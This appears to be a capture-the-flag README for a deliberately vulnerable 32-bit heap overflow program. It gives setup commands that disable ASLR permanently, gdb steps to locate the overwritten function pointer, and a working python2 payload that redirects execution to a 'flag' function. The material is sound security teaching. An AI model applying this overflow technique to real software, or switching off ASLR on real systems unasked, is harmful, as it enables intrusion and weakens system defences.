This problem is based on the example found [here](https://samsclass.info/127/proj/p7-heap0.htm).

# Setup
Tested on Ubuntu 18.04.

Compile binary (or use the one in this folder):
`gcc source.c -w -g -no-pie -z execstack -o binary -m32`

Disable ASLR on server:
```
# disable in current session
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# make change permanent (across reboots)
echo "kernel.randomize_va_space = 0" > /etc/sysctl.d/01-disable-aslr.conf
```

Add `flag.txt` file containing the flag in the same folder where the program will be run.

# Description
We've come across a service written located at `<ip> <port>` and would like to force it to 
print out the flag. We've uncovered the [binary](https://link) and the [source code](https://link), 
and we've noticed that it takes in input from stdin without checking the length and then calls 
a function in the next line. Can you come up with an input that will force the program to print the flag?

# Hints

## Name of Vuln
Heap overflow, or more specifically a Buffer Overflow that occurs on the Heap.

## Where
The program receives stdin on line 36, stores it in a variable, and then calls a function (stored next to the variable) in the next line.

## Vague solution strategy
Since the variable storing input from stdin is located next to the function on the heap, you can overwrite the address of the function that is called by passing a carefully crafted input through stdin.

## First steps to the solution
In `gdb`, use `disas` to find the addresses of `noflag` and `flag`. You can find the heap using `info proc map` and inspect it to see where input is stored in it and how far it's stored away from the address of `noflag`. You can also investigate starting at the address provided to you by the program in line 34.

# Solution
Use `gdb` to find the address of `noflag`.

```
disas noflag
```

In our case it's 0x08048511.

Now try running the program with an input to investigate the heap.
```
b 38          ; add a breakpoint before the function call
run           ; run the program with an input (enter AAAA when it prompts for input)
info proc map

```
Find the heap in the resulting list and the corresponding start address (with this binary, it's 0x804b000). Enter `x/120x 0x804b000` to inspect the heap. We can see that the input we entered (stored in hex as 0x41414141) is located at the address 0x804b160; and shortly after it is the address of `noflag` that we found earlier located at heap addres 0x804b1b0. That is the address we will need to overwrite with the address of `flag`. We can see that the address of `noflag` is located on the heap 80 bytes after the input; this is our offset.

Now we need to find the address to inject. Find the address of `flag` by running `disas flag` in `gdb` (here, it's 0x080484e6). 

We can now craft the attack using a simple python input:
```
python2 -c "print 'A'*80 + '\xe6\x84\x04\x08'" | ./binary
```
This payload should work on both the local and remote copies of the program if properly configured.
